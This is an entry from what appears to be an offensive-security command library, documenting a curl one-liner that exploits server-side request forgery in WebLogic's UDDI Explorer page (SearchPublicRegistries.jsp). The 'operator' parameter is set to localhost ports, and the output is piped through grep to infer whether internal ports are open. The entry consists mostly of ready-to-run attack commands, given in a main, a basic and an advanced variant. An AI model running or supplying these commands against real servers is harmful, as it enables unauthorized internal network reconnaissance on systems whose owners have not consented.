---
data: >-
  curl -G "http://target-server/uddiexplorer/SearchPublicRegistries.jsp" -d
  "operator=http://127.0.0.1:22" -d "rdoSearch=name" -d "txtSearchname=sdf" |
  grep -i "refused\|timeout"
tags:
  - ssrf
  - analysis
  - recon
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T04:39:02.466Z'
id: bafb73fc-edc0-4f12-a90e-47c2284b948b
verified: false
validated: true
submitted: true
---
# curl-ssrf-analyze

## Command

```bash
curl -G "http://target-server/uddiexplorer/SearchPublicRegistries.jsp" -d "operator=http://127.0.0.1:22" -d "rdoSearch=name" -d "txtSearchname=sdf" | grep -i "refused\|timeout"
```

## Description

Executes SSRF request and pipes output to grep for parsing connection status indicators.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| -G | GET mode | Yes |
| -d | Parameters | Yes |
| grep | Filter for error keywords | Yes |

## Examples

### Basic Usage

```bash
curl -G "http://target-server/uddiexplorer/SearchPublicRegistries.jsp" -d "operator=http://127.0.0.1:22" -d "rdoSearch=name" -d "txtSearchname=sdf" | grep -i "refused"
```

### Advanced Usage

```bash
curl -v -G "http://target-server/uddiexplorer/SearchPublicRegistries.jsp" -d "operator=http://127.0.0.1:80" | tee response.log | grep -i "connection"
```

## Expected Output

Filtered lines showing 'Connection refused' or similar, indicating port status.

## Related

- [[Related Procedure]]
